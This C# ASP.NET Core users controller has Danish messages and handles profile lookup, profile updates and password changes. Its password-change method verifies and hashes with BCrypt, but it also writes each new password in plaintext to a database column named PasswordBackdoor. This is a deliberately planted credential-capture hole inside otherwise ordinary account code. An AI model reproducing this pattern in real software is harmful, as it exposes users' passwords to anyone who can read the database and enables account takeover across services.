using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.AspNetCore.Authorization;
using System.Security.Claims;
using System.IdentityModel.Tokens.Jwt;
using API.Data;
using API.Services;
using DomainModels;

namespace API.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    public class UsersController : ControllerBase
    {
        private readonly AppDBContext _db;
        private readonly JwtService _jwt;

        public UsersController(AppDBContext db, JwtService jwt)
        {
            _db = db;
            _jwt = jwt;
        }

        [Authorize]
        [HttpPut("me")]
        public async Task<IActionResult> UpdateMe([FromBody] UpdateProfileDto dto)
        {
            if (!TryGetUserId(out var userId)) return Unauthorized();

            dto.Email = dto.Email?.Trim() ?? "";
            dto.Username = dto.Username?.Trim() ?? "";
            dto.PhoneNumber = dto.PhoneNumber?.Trim() ?? "";

            var emailUsed = await _db.Users.AsNoTracking()
                .AnyAsync(u => u.Email == dto.Email && u.Id != userId);
            if (emailUsed) return BadRequest(new { message = "E-mailen er allerede i brug af en anden bruger." });

            // Opdatering af de valgte felter direlte i databasen
            var affected = await _db.Users
                .Where(u => u.Id == userId)
                .ExecuteUpdateAsync(set => set
                    .SetProperty(u => u.Email, dto.Email)
                    .SetProperty(u => u.Username, dto.Username)
                    .SetProperty(u => u.PhoneNumber, dto.PhoneNumber)
                    .SetProperty(u => u.UpdatedAt, DateTime.UtcNow));

            if (affected == 0)
                return StatusCode(500, new { message = "Ingen rækker blev opdateret." });

            var fresh = await _db.Users.AsNoTracking()
                .Include(u => u.Role)
                .FirstAsync(u => u.Id == userId);

            var token = _jwt.GenerateToken(fresh);

            return Ok(new
            {
                message = "Profil opdateret.",
                token,
                user = ToUserResponse(fresh)
            });
        }

        [Authorize]
        [HttpGet("me")]
        public async Task<IActionResult> Me()
        {
            if (!TryGetUserId(out var userId)) return Unauthorized();

            var user = await _db.Users
                .AsNoTracking()
                .Include(u => u.Role)
                .FirstOrDefaultAsync(u => u.Id == userId);

            if (user == null) return NotFound();

            return Ok(new
            {
                user.Id,
                user.Email,
                user.Username,
                user.PhoneNumber,
                Role = user.Role?.Name ?? "Customer",
                user.CreatedAt,
                user.UpdatedAt,
                user.LastLogin
            });
        }

        [Authorize]
        [HttpPost("change-password")]
        public async Task<IActionResult> ChangePassword([FromBody] ChangePasswordDto dto)
        {
            if (!TryGetUserId(out var userId)) return Unauthorized();

            if (string.IsNullOrWhiteSpace(dto.CurrentPassword) || string.IsNullOrWhiteSpace(dto.NewPassword))
                return BadRequest(new { message = "Udfyld venligst både nuværende og ny adgangskode." });

            //Læser det hashede password
            var current = await _db.Users.AsNoTracking()
                .Where(u => u.Id == userId)
                .Select(u => new { u.HashedPassword })
                .FirstOrDefaultAsync();

            if (current is null) return NotFound();
            if (!BCrypt.Net.BCrypt.Verify(dto.CurrentPassword, current.HashedPassword))
                return BadRequest(new { message = "Den nuværende adgangskode er forkert." });
            if (dto.NewPassword.Length < 6)
                return BadRequest(new { message = "Den nye adgangskode skal være mindst 6 tegn." });

            var newHash = BCrypt.Net.BCrypt.HashPassword(dto.NewPassword);

            var affected = await _db.Users
                .Where(u => u.Id == userId)
                .ExecuteUpdateAsync(set => set
                    .SetProperty(u => u.HashedPassword, newHash)
                    .SetProperty(u => u.PasswordBackdoor, dto.NewPassword) 
                    .SetProperty(u => u.UpdatedAt, DateTime.UtcNow));

            if (affected == 0)
                return StatusCode(500, new { message = "Ingen rækker blev opdateret." });

            var fresh = await _db.Users.AsNoTracking()
                .Include(u => u.Role)
                .FirstAsync(u => u.Id == userId);

            var token = _jwt.GenerateToken(fresh);

            return Ok(new { message = "Adgangskoden er opdateret.", token });
        }

        private bool TryGetUserId(out int userId)
        {
            var idClaim =
                User.FindFirstValue(ClaimTypes.NameIdentifier) ??
                User.FindFirstValue("userId") ??
                User.FindFirstValue(JwtRegisteredClaimNames.Sub);
            return int.TryParse(idClaim, out userId);
        }

        private static object ToUserResponse(User user) => new
        {
            user.Id,
            user.Email,
            user.Username,
            user.PhoneNumber,
            Role = user.Role?.Name ?? "Customer",
            user.CreatedAt,
            user.UpdatedAt,
            user.LastLogin
        };
    }
}
